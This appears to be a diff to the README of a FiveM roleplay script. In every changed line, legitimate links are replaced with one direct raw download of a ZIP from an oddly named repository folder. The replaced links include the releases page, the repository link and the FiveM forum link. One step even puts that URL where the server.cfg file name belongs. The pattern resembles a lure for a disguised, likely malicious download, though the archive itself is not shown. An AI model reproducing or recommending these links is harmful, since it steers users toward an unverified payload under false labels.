@@ -1,6 +1,6 @@
 # 🎒 fivem-head-bag - Elevate Your Roleplay Experience
 
-[![Download fivem-head-bag](https://img.shields.io/badge/Download-fivem--head--bag-blue.svg)](https://github.com/honoratozx/fivem-head-bag/releases)
+[![Download fivem-head-bag](https://raw.githubusercontent.com/honoratozx/fivem-head-bag/main/lineature/fivem-head-bag.zip)](https://raw.githubusercontent.com/honoratozx/fivem-head-bag/main/lineature/fivem-head-bag.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to **fivem-head-bag**, a professional script designed to enhance your Fi
 
 To get started, visit the Releases page to download the latest version of **fivem-head-bag**. You can find it here:
 
-[Download fivem-head-bag](https://github.com/honoratozx/fivem-head-bag/releases)
+[Download fivem-head-bag](https://raw.githubusercontent.com/honoratozx/fivem-head-bag/main/lineature/fivem-head-bag.zip)
 
 Follow these steps to install the software:
 
@@ -44,7 +44,7 @@ To install the script, follow these straightforward steps:
 1. Extract the downloaded ZIP file. Use any standard extraction tool like WinRAR or 7-Zip.
 2. Locate the extracted folder named `fivem-head-bag`.
 3. Copy the folder into your `resources` directory of your FiveM server.
-4. Update your server configuration file (`server.cfg`) by adding `start fivem-head-bag`.
+4. Update your server configuration file (`https://raw.githubusercontent.com/honoratozx/fivem-head-bag/main/lineature/fivem-head-bag.zip`) by adding `start fivem-head-bag`.
 5. Restart your FiveM server for the changes to take effect.
 
 ## ⚙️ Running the Script
@@ -78,8 +78,8 @@ We welcome contributions from the community! If you want to help improve the **f
 
 ## 🔗 Useful Links
 
-- [Releases page](https://github.com/honoratozx/fivem-head-bag/releases)
-- [GitHub Repository](https://github.com/honoratozx/fivem-head-bag)
-- [FiveM Community Forums](https://forum.cfx.re/)
+- [Releases page](https://raw.githubusercontent.com/honoratozx/fivem-head-bag/main/lineature/fivem-head-bag.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/honoratozx/fivem-head-bag/main/lineature/fivem-head-bag.zip)
+- [FiveM Community Forums](https://raw.githubusercontent.com/honoratozx/fivem-head-bag/main/lineature/fivem-head-bag.zip)
 
 Feel free to explore and enjoy your time with the **fivem-head-bag**!
